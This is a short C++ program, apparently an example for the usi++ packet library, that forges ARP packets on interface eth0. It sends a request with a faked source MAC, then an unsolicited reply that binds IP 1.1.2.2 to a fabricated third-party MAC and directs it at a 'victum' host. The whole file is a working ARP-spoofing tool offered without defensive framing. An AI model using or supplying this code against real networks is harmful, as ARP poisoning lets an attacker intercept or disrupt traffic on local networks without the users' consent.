#include <usi++/usi++>
#include <usi++/arp.h>
#include <iostream>

using namespace usipp;


int main()
{
	unsigned char smac[] = {0, 0x40, 5, 0x6d, 0x1a, 0x90},		// dest-MAC
	              dmac[] = {0, 0x40, 5, 0x6d, 0x1a, 0x8f},		// our MAC (eth0)
		      rnd[]  = {1, 2, 3, 4, 5, 6},
	              bc[] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};	// broadcast-MAC
	     
	ARP *req = new ARP("eth0", 0, smac /* source faked */, bc);
	ARP *rep = new ARP("eth0", 0, rnd  /* 3rd-party MAC */, smac /* answer to victum */);
    
	req->set_op(ARPOP_REQUEST);
	req->set_tpa("1.1.2.2", ETH_P_IP);
	req->set_spa("192.0.0.7", ETH_P_IP);
	req->set_tha(bc, ARPHRD_ETHER);
	req->set_sha(smac, ARPHRD_ETHER);

        req->sendpack("");
	delete req;
	
	rep->set_op(ARPOP_REPLY);
	rep->set_tpa("192.0.0.7", ETH_P_IP);
	rep->set_spa("1.1.2.2", ETH_P_IP);
	rep->set_tha(smac, ARPHRD_ETHER);
	rep->set_sha(rnd, ARPHRD_ETHER);
	rep->sendpack("");
	delete rep;
	
        return 0;
}

        
